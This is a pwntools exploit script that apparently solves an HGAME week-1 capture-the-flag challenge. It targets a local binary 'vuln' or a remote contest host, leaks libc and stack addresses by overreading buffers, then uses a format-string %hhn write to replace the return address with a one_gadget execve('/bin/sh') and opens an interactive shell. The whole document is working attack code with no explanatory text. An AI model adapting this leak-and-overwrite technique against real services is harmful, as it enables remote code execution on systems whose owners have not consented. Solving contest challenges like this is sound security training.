from pwn import *
import time

context.log_level = 'info'

debug = True

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
if debug:
    io = process("./vuln")
else:
    io = remote("week-1.hgame.lwsec.cn", 31828)


def ddebug():
    gdb.attach(io)
    pause()


libcio_offset = libc.symbols["_IO_file_setbuf"]

rop = ROP('./vuln')
roplibc = ROP('./libc.so.6')
pop_rdi = rop.rdi.address

# leak libc
io.sendafter(" to let Yukkri say?\n", "a" * (0x5d8 - 0x500))
libciofile = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))

libc.address = libciofile - libcio_offset - 13
success("libcaddress -> " + hex(libc.address))

# leak stack
io.sendlineafter(" else?(Y/n)\n", "Y")
io.send("a" * (0xad0 - 0x9d0))
stack_rbp_p_16 = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
stack_rbp = stack_rbp_p_16 - 16
stack_rsp = stack_rbp - 0x120
success("stack_rbp " + hex(stack_rbp))
success("stack_rsp " + hex(stack_rsp))

# write onegadget
buf_offset_print = 8
stack_onegadget_address = stack_rsp + 0x10
#0xe3afe execve("/bin/sh", r15, r12)
#0xe3b01 execve("/bin/sh", r15, rdx)
#0xe3b04 execve("/bin/sh", rsi, rdx)
onegadget = libc.address + 0xe3b01
payload = b""
for i in range(6):
    payload += p64(stack_rbp + 8 + i)

io.sendlineafter(" else?(Y/n)\n", "Y")
io.send(payload)

# change return -> onegadget
payload = ""
p_stack_onegadget = p64(onegadget)
success("onegadget stack -> " + hex(stack_onegadget_address))
have_write = 0


def getnew(have, target):
    while target < have:
        target += 256
    return target - have


for i in range(6):
    offset = 8 + i
    count = p_stack_onegadget[i]
    need_count = getnew(have_write, count)
    payload += "%{}c%{}$hhn".format(need_count, offset)
    have_write = count

io.sendlineafter(" else?(Y/n)\n", "n")
io.sendlineafter("repared a gift for you:", payload)

io.recv()
io.interactive()
